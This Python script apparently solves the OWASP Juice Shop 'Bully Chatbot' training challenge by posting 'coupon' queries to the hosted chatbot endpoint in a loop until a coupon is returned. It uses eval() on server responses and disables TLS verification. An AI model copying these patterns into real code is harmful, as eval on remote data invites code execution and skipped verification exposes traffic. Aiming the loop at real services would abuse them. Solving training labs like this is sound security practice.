"""
This file is used to solve the OWASP Juice-shop Task BULLY CHATBOT
Methodology: We can send the COUPON message to the supporter machine several times, until it gives us COUPON
"""
import requests

from plugins import attack as a
from header_config import *
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_get_coupon_class(a.attack_inter):
    def __init__(self):
        pass

    def generator(self, json_data, cookies):
        headers = HEADER

        return cookies, headers, json_data

    def run(self):
        json_data = {
            'action': 'setname',
            'query': 'coupon',
        }
        cookies, headers, json_data = self.generator(json_data, COOKIE)
        response = a.requests.post('https://juice-shop.herokuapp.com/rest/chatbot/respond', cookies=cookies,
                                   headers=headers, json=json_data, verify=False)
        print(response.text)
        new_token = eval(response.text)["token"]
        print("new_token")
        print(new_token)

        while (response.text.find("pes[Cga+jm") == -1 ):
            json_data = {
                'action': 'query',
                'query': 'coupon',
            }
            new_cookie = COOKIE
            new_cookie["token"] = new_token
            cookies, headers, json_data = self.generator(json_data, new_cookie)
            response = a.requests.post('https://juice-shop.herokuapp.com/rest/chatbot/respond', cookies=cookies,
                                           headers=headers, json=json_data, verify=False)
            print(response.text)

        print("we found coupon:")
        print(response.text)